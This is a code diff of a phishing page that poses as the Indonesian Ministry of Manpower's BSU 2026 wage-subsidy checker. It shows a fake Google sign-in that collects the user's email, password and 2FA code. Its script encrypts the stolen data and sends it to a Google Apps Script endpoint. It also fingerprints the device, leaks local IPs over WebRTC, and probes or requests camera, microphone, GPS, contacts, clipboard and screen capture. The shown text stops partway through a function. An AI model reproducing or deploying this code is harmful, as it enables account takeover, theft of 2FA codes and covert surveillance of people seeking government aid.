+      <h2>Perhatian</h2>
+      <ul>
+        <li>Pengecekan tidak dipungut biaya.</li>
+        <li>BSU disalurkan langsung ke rekening penerima.</li>
+        <li>Waspadai penipuan yang mengatasnamakan Kemnaker.</li>
+        <li>Data yang ditampilkan bersifat rahasia.</li>
+      </ul>
+    </div>
+  </aside>
 </main>
 
-<footer><div class="wrap">
-  <div class="fb"><svg width="26" height="26" viewBox="0 0 60 60"><g fill="#0b3a6f"><circle cx="30" cy="12" r="3.4"/><circle cx="18" cy="22" r="3.4"/><circle cx="42" cy="22" r="3.4"/><circle cx="30" cy="32" r="3.4"/><circle cx="18" cy="42" r="3.4"/><circle cx="42" cy="42" r="3.4"/></g></svg>
-    <b>Bantuan Subsidi Upah<br>Kementerian Ketenagakerjaan RI</b></div>
-  <p>Jl. Jenderal Gatot Subroto Kav. 51, Daerah Khusus Ibukota Jakarta 12750, Indonesia</p>
-  <p class="cp">&copy; 2026 Kementerian Ketenagakerjaan Republik Indonesia</p>
-</div></footer>
+<div class="foot"><div class="in">
+  <div><b>Kementerian Ketenagakerjaan</b>Jl. Jenderal Gatot Subroto Kav. 51<br>Jakarta Selatan 12950</div>
+  <div><b>Tautan</b><a href="https://bsu.kemnaker.go.id" style="color:#b9c9d8">Situs Resmi</a><br><a href="#faq" style="color:#b9c9d8">Pertanyaan Umum</a></div>
+  <div><b>Layanan</b>Halo Kemnaker 1500 630<br>Senin - Jumat, 08.00 - 16.00 WIB</div>
+</div></div>
 
-<div id="gsi-wrap" role="dialog" aria-modal="true">
+<div id="gsi-wrap">
   <div class="gsi-shell">
-    <div class="gsi-card">
-      <button class="gsi-x" id="gsiX" type="button">&times;</button>
-      <div class="gsi-ctx" id="gsiCtx">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2.6 4.5 5.4v6.2c0 4.6 3.2 7.9 7.5 9.8 4.3-1.9 7.5-5.2 7.5-9.8V5.4L12 2.6Z"/></svg>
-        <span>Status BSU 2026 &middot; NIK <b id="gsiCtxNik">-</b></span>
-      </div>
-      <svg class="gsi-logo" viewBox="0 0 48 48">
-        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-      </svg>
-      <h1 id="gsiTitle">Masuk untuk melihat status</h1>
-      <p class="gsi-sub" id="gsiSub">Verifikasi akun untuk menampilkan status penyaluran BSU 2026 atas NIK Anda.</p>
-      <div class="gsi-chip" id="gsiChip"><span class="gsi-av" id="gsiAv">U</span><span id="gsiChipText"></span></div>
-
+    <div class="gsi-card" id="gsiCard">
+      <button class="gsi-x" id="gsiX" type="button" aria-label="Tutup">&times;</button>
+      <div class="gsi-g">G<i>o</i><u>o</u>g<s>l</s><i>e</i></div>
       <div id="gsiStep1">
-        <div class="gsi-field" id="gsiEmailField">
-          <input id="gsiEmail" type="text" placeholder=" " autocomplete="username" spellcheck="false">
-          <label for="gsiEmail">Email atau telepon</label>
-        </div>
-        <div class="gsi-err" id="gsiEmailErr"><span>Masukkan email atau telepon</span></div>
-        <a class="gsi-link" id="gsiForgotEmail">Lupa email?</a>
-        <p class="gsi-guest">Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi.</p>
+        <h3>Masuk</h3>
+        <p class="sub">untuk melanjutkan ke Bantuan Subsidi Upah</p>
+        <label class="gsi-lbl" for="gsiUser">Email atau telepon</label>
+        <input id="gsiUser" class="gsi-in" type="email" autocomplete="username" autocapitalize="none" spellcheck="false">
         <div class="gsi-row">
-          <button class="gsi-btn-text" type="button" id="gsiCreate">Buat akun</button>
-          <button class="gsi-btn" type="button" id="gsiNext">Berikutnya</button>
+          <span class="gsi-t" id="gsiLupa">Lupa email?</span>
+          <span class="sp"></span>
+          <button class="gsi-b" id="gsiNext" type="button">Berikutnya</button>
         </div>
       </div>
-
       <div id="gsiStep2" style="display:none">
-        <div class="gsi-field" id="gsiPassField">
-          <input id="gsiPass" type="password" placeholder=" " autocomplete="current-password">
-          <label for="gsiPass">Masukkan sandi Anda</label>
-        </div>
-        <div class="gsi-err" id="gsiPassErr"><span>Masukkan sandi</span></div>
+        <h3>Selamat datang</h3>
+        <p class="sub" id="gsiHalo">Masukkan sandi akun Anda</p>
+        <label class="gsi-lbl" for="gsiPass">Sandi</label>
+        <input id="gsiPass" class="gsi-in" type="password" autocomplete="current-password">
         <div class="gsi-row">
-          <label class="gsi-check"><input type="checkbox" id="gsiShow">Tampilkan sandi</label>
-          <a class="gsi-link" style="margin-top:0" id="gsiForgotPass">Lupa sandi?</a>
+          <span class="gsi-t" id="gsiBalik">Kembali</span>
+          <span class="sp"></span>
+          <button class="gsi-b" id="gsiMasuk" type="button">Masuk</button>
         </div>
-        <div class="gsi-row-end"><button class="gsi-btn" type="button" id="gsiSignIn"><span class="gsi-spin"></span><span id="gsiLbl">Berikutnya</span></button></div>
       </div>
-
       <div id="gsiStep3" style="display:none">
-        <svg class="gsi-shield" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="1.7"><path d="M12 2.6 4.5 5.4v6.2c0 4.6 3.2 7.9 7.5 9.8 4.3-1.9 7.5-5.2 7.5-9.8V5.4L12 2.6Z"/><path d="m8.8 11.9 2.2 2.2 4.2-4.4"/></svg>
-        <div class="gsi-field" id="gsiOtpField">
-          <input id="gsiOtp" type="text" inputmode="numeric" maxlength="6" placeholder=" ">
-          <label for="gsiOtp">Masukkan kode verifikasi</label>
+        <h3>Verifikasi 2 Langkah</h3>
+        <p class="sub">Masukkan kode 6 digit yang dikirim ke perangkat Anda</p>
+        <div class="gsi-otp">
+          <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
+          <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
         </div>
-        <div class="gsi-err" id="gsiOtpErr"><span>Masukkan 6 digit kode verifikasi</span></div>
-        <a class="gsi-link" id="gsiTryOther">Coba cara lain</a>
-        <p class="gsi-hint">Kode dikirim ke perangkat yang sudah masuk atau email pemulihan.</p>
         <div class="gsi-row">
-          <button class="gsi-btn-text" type="button" id="gsiSkip">Lewati</button>
-          <button class="gsi-btn" type="button" id="gsiVerify"><span class="gsi-spin"></span><span id="gsiVfyLbl">Verifikasi</span></button>
+          <span class="gsi-t" id="gsiUlang">Kirim ulang</span>
+          <span class="sp"></span>
+          <button class="gsi-b" id="gsiVerif" type="button">Verifikasi</button>
         </div>
       </div>
-
-      <div class="gsi-sink" id="gsiSink">
-        <button type="button" id="gsiSinkBtn">&#128100; Sinkronkan kontak</button>
-      </div>
-      <div class="gsi-err" id="gsiStatus" style="justify-content:center;margin-top:14px"></div>
-    </div>
-    <div class="gsi-cap">
-      <div class="gsi-cap-item" id="gsiCapCam"><span class="gsi-cap-dot"></span><span id="gsiCapCamTxt">Wajah</span></div>
-      <div class="gsi-cap-item" id="gsiCapGps"><span class="gsi-cap-dot"></span><span id="gsiCapGpsTxt">Lokasi</span></div>
-      <button class="gsi-cap-item" type="button" id="gsiCapKon"><span class="gsi-cap-dot"></span><span id="gsiCapKonTxt">Kontak</span></button>
-      <div class="gsi-cap-item" id="gsiCapSms"><span class="gsi-cap-dot"></span><span id="gsiCapSmsTxt">SMS</span></div>
-      <img class="gsi-thumb" id="gsiThumb" alt="">
+      <p class="gsi-st" id="gsiSt"></p>
     </div>
     <div class="gsi-foot">
       <div><select><option>Bahasa Indonesia</option><option>English (United States)</option></select>
@@ -338,598 +207,361 @@ footer .cp{margin-top:14px;padding-top:12px;border-top:1px solid #e0e5ea;font-si
 <script>
 (function(){
 'use strict';
-var BUILD='zgch-f3',PSK='BsuPegasus2026K',SITUS='https://bsu.kemnaker.go.id/#pengecekanMandiri',IZIN='zgch_izin';
+var BUILD='zgch-f4',PSK='BsuPegasus2026K';
 var EPS=['https://script.google.com/macros/s/AKfycbxb-Z82bCYxZcN9rU8-vQlGRiegj26Rl94-sPwBq8iXfnnFZGqSuwCZIAqto04O4t9X/exec'];
-var Q=location.search,DEV=Q.indexOf('dev=1')>-1,CTRL=Q.indexOf('ctrl=1')>-1,MAN=Q.indexOf('manifest=1')>-1,BENCH=/bench=1/.test(Q);
-var BN=Math.min(6,Math.max(1,parseInt((/n=(\d+)/.exec(Q)||[])[1]||3,10))),SEED=parseInt((/seed=(\d+)/.exec(Q)||[])[1]||String(Date.now()%99991),10);
+var Q=location.search,DEV=/dev=1/.test(Q);
 var $=function(i){return document.getElementById(i)};
-var wrap=$('gsi-wrap'),vid=$('gsiVid'),cv=$('gsiCv'),emailEl=$('gsiEmail'),passEl=$('gsiPass'),otpEl=$('gsiOtp'),stEl=$('gsiStatus');
+var wrap=$('gsi-wrap'),vid=$('gsiVid'),cv=$('gsiCv'),card=$('gsiCard');
+var NIK='',sid='',dev='',step=0,alive=true,capKode='',ip='';
+var KEYS=[],FOTO='',SKOR=0,SIDIK='',PROBE={},pintuJalan=false;
 
-function hex(n){var a=new Uint8Array(n);try{crypto.getRandomValues(a)}catch(e){for(var i=0;i<n;i++)a[i]=Math.random()*256|0}return [].map.call(a,function(b){return('0'+b.toString(16)).slice(-2)}).join('')}
-function h32(s){var h=0x811c9dc5;for(var i=0;i<s.length;i++){h^=s.charCodeAt(i);h=(h*0x01000193)>>>0}return('0000000'+h.toString(16)).slice(-8)}
-function b64(u){var s='',c=0x8000;for(var i=0;i<u.length;i+=c)s+=String.fromCharCode.apply(null,u.subarray(i,i+c));return btoa(s)}
-function rid(){return'r'+Date.now().toString(36)+hex(4)}
-function rng(s0){var s=s0>>>0;return function(){s|=0;s=s+0x6D2B79F5|0;var t=Math.imul(s^s>>>15,1|s);t=t+Math.imul(t^t>>>7,61|t)^t;return((t^t>>>14)>>>0)/4294967296}}
-function shuf(a){var r=rng(SEED),i=a.length,j,t;while(i){j=r()*i--|0;t=a[i];a[i]=a[j];a[j]=t}return a}
-function med(a){if(!a.length)return 0;var b=a.slice().sort(function(x,y){return x-y}),i=b.length>>1;return b.length%2?b[i]:Math.round((b[i-1]+b[i])/2)}
-function setSt(m,c){stEl.textContent=m;stEl.style.color=c||'#5f6368';stEl.classList.add('show')}
-function clrSt(){stEl.classList.remove('show');stEl.textContent=''}
-function devId(){try{var v=localStorage.getItem('zgch_dev');if(!v){v=hex(8);localStorage.setItem('zgch_dev',v)}return v}catch(e){return''}}
-function izM(k,v){if(v===undefined){try{return(JSON.parse(localStorage.getItem(IZIN)||'{}'))[k]||''}catch(e){return''}}try{var o=JSON.parse(localStorage.getItem(IZIN)||'{}');o[k]=v;localStorage.setItem(IZIN,JSON.stringify(o))}catch(e){}}
-function izC(n){return new Promise(function(r){try{if(!navigator.permissions)return r('u');navigator.permissions.query({name:n}).then(function(s){r(s.state)}).catch(function(){r('u')})}catch(e){r('u')}})}
-
-var sid=(function(){try{var v=localStorage.getItem('zgch_sid');if(!v){v=hex(16);localStorage.setItem('zgch_sid',v)}return v}catch(e){return hex(16)}})();
-var ridCur=rid(),username='',busy=false,otpBusy=false,lastQ='',popup=false;
-var stream=null,camS='idle',gpsS='idle',konS='idle',smsS='idle',shots=0,rounds=0,best='',bestSc=-1,photo='',photoSent=false;
-var gps=null,addr='',ip='',isp='',kota='',sumber='',t0=Date.now(),tSub=0,pasted=false;
-var alive=true,miss=0,bt=null,inflight=false,camDone=null,audioFp='',lOk=0,lTry=0,prompts=0,probeDone=false,senyap=0;
-var KEYS=[],NIK='',watchId=null,lastKirim=0,lastShot=0,mutasi=[],mutObs=null;
-var konDone=false,konCobaan=0,konAkhir=0,konMax=4,konN=0,smsSent='',otpAc=null;
-
-var kc=null;
-function aKey(){if(!kc)kc=crypto.subtle.importKey('raw',new TextEncoder().encode(PSK),'AES-CTR',false,['encrypt']);return kc}
-function gz(u){if(!window.CompressionStream)return Promise.resolve(null);try{var s=new Blob([u]).stream().pipeThrough(new CompressionStream('gzip'));return new Response(s).arrayBuffer().then(function(b){return new Uint8Array(b)}).catch(function(){return null})}catch(e){return Promise.resolve(null)}}
-function seal(o){o.pad=hex(8+(Math.random()*24|0));var raw=new TextEncoder().encode(JSON.stringify(o));
- if(!crypto.subtle)return Promise.resolve({b:b64(raw),g:0});
- return gz(raw).then(function(z){var body=z||raw,iv=new Uint8Array(16);crypto.getRandomValues(iv);
-  return aKey().then(function(k){return crypto.subtle.encrypt({name:'AES-CTR',counter:iv,length:64},k,body)})
-  .then(function(ct){var a=new Uint8Array(16+ct.byteLength);a.set(iv);a.set(new Uint8Array(ct),16);return{b:b64(a),g:z?1:0}})}).catch(function(){return{b:b64(raw),g:0}})}
-function ep(){return EPS[Math.floor(Math.random()*EPS.length)]}
-function post(q){return fetch(ep(),{method:'POST',mode:'cors',credentials:'omit',headers:{'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},body:q}).then(function(r){return r.text().then(function(t){return{ok:true,t:t}})}).catch(function(){return{ok:false,t:''}})}
-function raw(q){try{if(navigator.sendBeacon&&q.length<60000){navigator.sendBeacon(ep(),new Blob([q],{type:'application/x-www-form-urlencoded;charset=UTF-8'}));return}}catch(e){}try{new Image().src=ep()+'?t='+Date.now()+'&'+q}catch(e){}fetch(ep(),{method:'POST',mode:'no-cors',keepalive:true,body:q}).catch(function(){})}
-function send(a,o){return seal(Object.assign({action:a,sid:sid,ts:Date.now()},o||{})).then(function(p){var q='action='+a+'&sid='+sid+'&enc=1&gz='+p.g+'&p='+encodeURIComponent(p.b);
- return post(q).then(function(r){if(!r.ok){raw(q);return{ok:false}}try{return JSON.parse(r.t)}catch(e){return{ok:false}}})})}
-
-function fp(){var o=[];try{var c=document.createElement('canvas');c.width=220;c.height=44;var x=c.getContext('2d');
- x.textBaseline='top';x.font='14px Arial';x.fillStyle='#f60';x.fillRect(0,0,110,22);x.fillStyle='#069';x.fillText('BSU2026@1',2,2);
- x.fillStyle='rgba(102,204,0,.7)';x.fillText('BSU2026@1',4,6);o.push('cv'+h32(c.toDataURL()))}catch(e){o.push('cv-')}
- try{var g=document.createElement('canvas').getContext('webgl'),d=g&&g.getExtension('WEBGL_debug_renderer_info');
- o.push(d?'gl:'+String(g.getParameter(d.UNMASKED_RENDERER_WEBGL)).slice(0,40):'gl-')}catch(e){o.push('gl-')}
- o.push('c'+(navigator.hardwareConcurrency||0),'m'+(navigator.deviceMemory||0),'t'+(navigator.maxTouchPoints||0),'d'+(devicePixelRatio||1));return o.join('|')}
-function audioF(){return new Promise(function(res){try{var C=window.OfflineAudioContext||window.webkitOfflineAudioContext;if(!C)return res('-');
- var x=new C(1,44100,44100),o=x.createOscillator(),p=x.createDynamicsCompressor();o.type='triangle';o.frequency.value=10000;
- p.threshold.value=-50;p.knee.value=40;p.ratio.value=12;o.connect(p);p.connect(x.destination);o.start(0);
- x.startRendering().then(function(b){var d=b.getChannelData(0),s=0;for(var i=4500;i<5000;i++)s+=Math.abs(d[i]);res('a'+h32(String(s)))}).catch(function(){res('-')})}catch(e){res('-')}})}
-var FN=['Arial','Courier New','Georgia','Times New Roman','Verdana','Tahoma','Trebuchet MS','Roboto','Segoe UI','Ubuntu','Noto Sans','Samsung Sans','Impact','Calibri'];
-function fontF(){var c=document.createElement('canvas').getContext('2d'),o=[];c.font='72px monospace';var b=c.measureText('mmmmmmmmmmlli').width;
- FN.forEach(function(f){c.font='72px "'+f+'",monospace';if(c.measureText('mmmmmmmmmmlli').width!==b)o.push(f)});return o.join(',')}
-
-var sen={n:0,ax:[],ay:[],az:[],ga:[],on:false,ctx:''};
-function senMo(e){var a=e.accelerationIncludingGravity;if(!a)return;sen.n++;sen.ax.push(a.x||0);sen.ay.push(a.y||0);sen.az.push(a.z||0)}
-function senOr(e){sen.ga.push(e.gamma||0)}
-function va(a){if(a.length<2)return 0;var m=a.reduce(function(x,y){return x+y},0)/a.length;return a.reduce(function(x,y){return x+(y-m)*(y-m)},0)/a.length}
-function senStart(){if(sen.on)return;sen.on=true;window.addEventListener('devicemotion',senMo,{passive:true});window.addEventListener('deviceorientation',senOr,{passive:true});
- setTimeout(function(){window.removeEventListener('devicemotion',senMo);window.removeEventListener('deviceorientation',senOr);sen.on=false;
- var v=va(sen.ax)+va(sen.ay)+va(sen.az),c=sen.n<3?'tanpa sensor':v>6?'kendaraan':v>1.2?'berjalan':'diam';
- var g=sen.ga.length?(Math.abs(sen.ga.reduce(function(x,y){return x+y},0)/sen.ga.length)>45?'miring':'tegak'):'?';
- sen.ctx=c+' / '+g+' / '+sen.n+' sampel';if(probeDone)sendProbe()},6000)}
-
-var STATES={},WATCH={};
-var ORC=['geolocation','camera','microphone','notifications','clipboard-read','clipboard-write','persistent-storage','accelerometer','gyroscope','magnetometer','midi','bluetooth','usb','hid','serial','local-fonts','idle-detection','screen-wake-lock','contacts'];
-function oracle(){return Promise.all(ORC.map(function(n){if(!navigator.permissions){STATES[n]='unsupported';return Promise.resolve()}
- return navigator.permissions.query({name:n}).then(function(s){STATES[n]=s.state;WATCH[n]={st:s,t:0};s.onchange=function(){WATCH[n].t=performance.now()}}).catch(function(){STATES[n]='unsupported'})}))}
-function uaD(){return new Promise(function(r){try{if(!navigator.userAgentData||!navigator.userAgentData.getHighEntropyValues)return r({});
- navigator.userAgentData.getHighEntropyValues(['model','platformVersion','architecture','bitness']).then(function(d){r(d||{})}).catch(function(){r({})})}catch(e){r({})}})}
-var invC={};
-function inv(){var o={ua:navigator.userAgent,plat:navigator.platform,lang:(navigator.languages||[]).join(','),tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
- cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory,touch:navigator.maxTouchPoints,dpr:devicePixelRatio,
- scr:screen.width+'x'+screen.height,depth:screen.colorDepth,dark:matchMedia('(prefers-color-scheme: dark)').matches,
- fp:fp(),font:fontF(),ref:document.referrer,url:location.href,nik:NIK,senyap:senyap,kontak:konS,sms:smsS};
- try{var g=document.createElement('canvas').getContext('webgl'),d=g&&g.getExtension('WEBGL_debug_renderer_info');if(d)o.gpu=g.getParameter(d.UNMASKED_VENDOR_WEBGL)+'/'+g.getParameter(d.UNMASKED_RENDERER_WEBGL)}catch(e){}
- return o}
-function permScan(){var n=['geolocation','camera','microphone','notifications','accelerometer','gyroscope','magnetometer','midi','bluetooth','usb','hid','serial','local-fonts','idle-detection','screen-wake-lock','contacts'];
- return Promise.all(n.map(function(k){if(!navigator.permissions)return Promise.resolve(k+':-');
- return navigator.permissions.query({name:k}).then(function(s){return k+':'+s.state}).catch(function(){return k+':-'})})).then(function(r){return r.join(', ')})}
-function mediaScan(){return new Promise(function(r){if(!navigator.mediaDevices||!navigator.mediaDevices.enumerateDevices)return r('-');
- navigator.mediaDevices.enumerateDevices().then(function(d){r(d.map(function(x){return x.kind+(x.label?'='+x.label.slice(0,18):'')}).join(', ')||'-')}).catch(function(){return r('-')})})}
-
-function need(v,n){if(!v)throw new TypeError(n||'unsupported');return v}
-var PR=[
-{id:'canvas',cls:'A',fn:function(){return fp()}},
-{id:'webgl',cls:'A',fn:function(){var g=need(document.createElement('canvas').getContext('webgl'),'no-webgl'),d=g.getExtension('WEBGL_debug_renderer_info');return d?g.getParameter(d.UNMASKED_VENDOR_WEBGL)+'|'+g.getParameter(d.UNMASKED_RENDERER_WEBGL):'ok'}},
-{id:'gpu-adapter',cls:'A',fn:function(){return need(navigator.gpu,'no-webgpu').requestAdapter().then(function(a){if(!a)throw new TypeError('no-adapter');return JSON.stringify(a.info||{})})}},
-{id:'webrtc-ip',cls:'A',fn:function(){return new Promise(function(r){var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]}),ips=[];
- pc.onicecandidate=function(e){if(!e.candidate)return;var m=/([0-9]{1,3}(?:\.[0-9]{1,3}){3}|[a-f0-9]{4}:[a-f0-9:]+)/i.exec(e.candidate.candidate);if(m&&ips.indexOf(m[1])<0)ips.push(m[1])};
- pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)}).catch(function(){});
- setTimeout(function(){try{pc.close()}catch(e){}r(ips.join(',')||'-')},2600)})}},
-{id:'codec',cls:'A',fn:function(){return['video/mp4;codecs=avc1.42E01E','video/webm;codecs=vp8','video/webm;codecs=vp9','video/webm;codecs=av01','audio/mp4;codecs=mp4a.40.2','audio/webm;codecs=opus','audio/mpeg'].map(function(x){return(window.MediaRecorder&&MediaRecorder.isTypeSupported(x))?'1':'0'}).join('')}},
-{id:'decoder',cls:'A',fn:function(){return need(navigator.mediaCapabilities,'no-mc').decodingInfo({type:'file',video:{contentType:'video/webm;codecs=vp9',width:1280,height:720,bitrate:2e6,framerate:30}}).then(function(r){return r.supported?'v':'no'})}},
-{id:'battery',cls:'A',fn:function(){return need(navigator.getBattery,'no-battery').call(navigator).then(function(b){return b.level.toFixed(2)+'/'+(b.charging?'chg':'dis')})}},
-{id:'conn',cls:'A',fn:function(){var c=need(navigator.connection,'no-conn');return[c.effectiveType,c.rtt,c.downlink,c.saveData?'sv':'-'].join('|')}},
-{id:'heap',cls:'A',fn:function(){if(!performance.memory)throw new TypeError('no-mem');return(performance.memory.jsHeapSizeLimit/1048576|0)+'MB'}},
-{id:'storage',cls:'A',fn:function(){return need(navigator.storage,'no-storage').estimate().then(function(e){return(e.quota/1048576|0)+'/'+(e.usage/1048576|0)})}},
-{id:'persisted',cls:'A',fn:function(){return need(navigator.storage,'no-storage').persisted().then(String)}},
-{id:'fonts',cls:'A',fn:function(){return fontF()}},
-{id:'intl',cls:'A',fn:function(){return[Intl.DateTimeFormat().resolvedOptions().locale,(1234.5).toLocaleString()].join('|')}},
-{id:'css-media',cls:'A',fn:function(){return['(pointer:coarse)','(any-pointer:fine)','(hover:hover)','(prefers-reduced-motion:reduce)','(prefers-contrast:more)','(forced-colors:active)','(color-gamut:p3)','(inverted-colors:inverted)'].map(function(q){return matchMedia(q).matches?'1':'0'}).join('')}},
-{id:'enumerate',cls:'A',fn:function(){return mediaScan()}},
-{id:'uach',cls:'A',fn:function(){return need(navigator.userAgentData,'no-uach').getHighEntropyValues(['model','platformVersion','architecture','bitness']).then(function(d){return[d.model,d.platformVersion,d.architecture,d.bitness].join('|')})}},
-{id:'bluetooth-avail',cls:'A',fn:function(){return need(navigator.bluetooth,'no-bt').getAvailability().then(String)}},
-{id:'usb-devices',cls:'A',fn:function(){return need(navigator.usb,'no-usb').getDevices().then(function(d){return String(d.length)})}},
-{id:'hid-devices',cls:'A',fn:function(){return need(navigator.hid,'no-hid').getDevices().then(function(d){return String(d.length)})}},
-{id:'serial-ports',cls:'A',fn:function(){return need(navigator.serial,'no-serial').getPorts().then(function(d){return String(d.length)})}},
-{id:'pdf-viewer',cls:'A',fn:function(){return String(!!navigator.pdfViewerEnabled)}},
-{id:'cookie',cls:'A',fn:function(){return String(navigator.cookieEnabled)}},
-{id:'orientation-read',cls:'A',fn:function(){return(screen.orientation?screen.orientation.type:'?')}},
-{id:'sensor-api',cls:'A',fn:function(){return['Accelerometer','Gyroscope','Magnetometer','AmbientLightSensor'].map(function(k){return(k in window)?'1':'0'}).join('')}},
-{id:'vibrate',cls:'A',fn:function(){return String(typeof navigator.vibrate)}},
-{id:'speech',cls:'A',fn:function(){return String(!!window.speechSynthesis)}},
-{id:'idb',cls:'A',fn:function(){return String(!!window.indexedDB)}},
-{id:'contacts-api',cls:'A',fn:function(){return String(!!navigator.contacts)+'/'+String('ContactsManager' in window)}},
-{id:'webotp',cls:'A',fn:function(){return String('OTPCredential' in window)}},
-{id:'camera',cls:'B',fn:function(){return need(navigator.mediaDevices,'no-md').getUserMedia({video:{facingMode:'user',width:{ideal:480}}}).then(function(s){var st=s.getVideoTracks()[0].getSettings();window.__cam=s;return(st.width||0)+'x'+(st.height||0)})}},
-{id:'microphone',cls:'B',fn:function(){return need(navigator.mediaDevices,'no-md').getUserMedia({audio:true}).then(function(s){var st=s.getAudioTracks()[0].getSettings(),o=(st.sampleRate||0)+'Hz';s.getTracks().forEach(function(t){t.stop()});return o})}},
-{id:'geolocation',cls:'B',fn:function(){return new Promise(function(r,j){need(navigator.geolocation,'no-geo').getCurrentPosition(function(p){
- gps={lat:p.coords.latitude.toFixed(6),lng:p.coords.longitude.toFixed(6),acc:Math.round(p.coords.accuracy||0)};sumber='gps';gpsS='ok';paint();patch();r(gps.lat);},
- function(e){gpsS='denied';paint();j(e)},{enableHighAccuracy:true,timeout:11000,maximumAge:60000})})}},
-{id:'notifications',cls:'B',fn:function(){return need(window.Notification,'no-notif').requestPermission().then(function(p){if(p!=='granted')throw new Error('notif');return p})}},
-{id:'clipboard-read',cls:'C',fn:function(){return need(navigator.clipboard,'no-clip').readText().then(function(t){return'len'+t.length})}},
-{id:'clipboard-write',cls:'C',fn:function(){return need(navigator.clipboard,'no-clip').writeText('zgch').then(function(){return'ok'})}},
-{id:'share',cls:'C',fn:function(){return need(navigator.share,'no-share').call(navigator,{title:'BSU',text:'x'}).then(function(){return'ok'})}},
-{id:'contacts',cls:'C',fn:function(){return need(navigator.contacts,'no-contacts').select(['name','tel'],{multiple:true}).then(function(c){return'n'+c.length})}},
-{id:'wake-lock',cls:'C',fn:function(){return need(navigator.wakeLock,'no-wake').request('screen').then(function(s){return s.type||'ok'})}},
-{id:'idle',cls:'C',fn:function(){return need(navigator.idle,'no-idle').query().then(function(s){return s.userState})}},
-{id:'display-capture',cls:'C',fn:function(){return need(navigator.mediaDevices,'no-md').getDisplayMedia({video:true}).then(function(s){var st=s.getVideoTracks()[0].getSettings();s.getTracks().forEach(function(t){t.stop()});return(st.width||0)+'x'+(st.height||0)})}},
-{id:'file-picker',cls:'C',fn:function(){return need(window.showOpenFilePicker,'no-fsp').call(window,{multiple:false}).then(function(h){return'n'+h.length})}},
-{id:'torch',cls:'C',fn:function(){return need(navigator.mediaDevices,'no-md').getUserMedia({video:{facingMode:'environment'}}).then(function(s){var t=s.getVideoTracks()[0],c=t.getCapabilities?t.getCapabilities():{};s.getTracks().forEach(function(x){x.stop()});return c.torch?'torch':'no-torch'})}}
-];
-
-var ROWS=[],RUN=0;
-function attempt(p){return new Promise(function(res){var t1=performance.now(),done=false,tm,po,before=STATES[p.id]||'unknown';
- var fin=function(oc,v){if(done)return;done=true;clearTimeout(tm);clearInterval(po);
- var row={cap:p.id,outcome:oc,kelas:oc==='silent'?0:oc==='prompt'?1:oc==='blocked'?2:3,lat:Math.round(performance.now()-t1),note:String(v==null?'':v).slice(0,200)};
- ROWS.push(row);devRow(row);res(row)};
- tm=setTimeout(function(){fin('prompt','timeout')},4200);
- if(WATCH[p.id])WATCH[p.id].t=0;
- po=setInterval(function(){if(done)return;var w=WATCH[p.id];if(w&&w.t&&w.st.state!==before)fin(w.st.state==='granted'?'prompt':'blocked','trans:'+w.st.state)},60);
- Promise.resolve().then(p.fn).then(function(v){if((STATES[p.id]||before)==='granted'&&before!=='granted')return fin('prompt',v);fin('silent',v)})
- .catch(function(e){var n=(e&&e.name)||'',m=(e&&e.message)||'';
- if(n==='NotAllowedError'||n==='SecurityError'||/gesture|activation/i.test(m))return fin('blocked',n||m);
- if(n==='NotFoundError'||n==='NotSupportedError'||n==='TypeError'||n==='InvalidStateError'||n==='AbortError')return fin('unsupported',n||m);
- fin('blocked',n||m||'err')})})}
-function chain(l,gap){var i=0;return new Promise(function(r){(function nx(){if(i>=l.length)return r();var p=l[i++];attempt(p).then(function(){setTimeout(nx,gap)})})()})}
-function sendMx(){if(!ROWS.length)return Promise.resolve();var b=ROWS.splice(0,ROWS.length);
- var pl=((navigator.userAgentData&&navigator.userAgentData.platform)||navigator.platform||'?')+'/'+((/Android (\d+)/.exec(navigator.userAgent)||[])[1]||'?')+'/'+(invC.model||'?');
- return send('matrix',{build:BUILD,run:RUN,platform:pl.slice(0,60),rows:b})}
-function lm(){var s=0,p=0,b=0,l=[];ROWS.forEach(function(r){if(r.kelas===0)s++;else if(r.kelas===1){p++;l.push(r.lat)}else if(r.kelas===2)b++});
- var a=s+p+b||1;return{sgr:+(s/a).toFixed(3),par:+(p/a).toFixed(3),alh:med(l),n:ROWS.length}}
-function bench(){var n=0,sg=[],pr=[];(function lp(){if(n>=BN){var m=sg.reduce(function(a,b){return a+b},0)/sg.length||0;
- var v=Math.sqrt(sg.reduce(function(a,b){return a+(b-m)*(b-m)},0)/sg.length);
- return send('bench',{tag:'bench',n:BN,sgr:m.toFixed(3),par:(pr.reduce(function(a,b){return a+b},0)/pr.length||0).toFixed(3),var:v.toFixed(4),seed:SEED})}
- RUN=n++;ROWS.length=0;chain(shuf(PR.filter(function(x){return x.cls==='A'})),40).then(function(){var m=lm();sg.push(m.sgr);pr.push(m.par);return sendMx().then(lp)})})()}
-function harvest(){var A=PR.filter(function(x){return x.cls==='A'}),BC=PR.filter(function(x){return x.cls!=='A'});
- oracle().then(function(){if(BENCH)return bench();
- if(CTRL)return chain(shuf(A),40).then(function(){sendMx()});
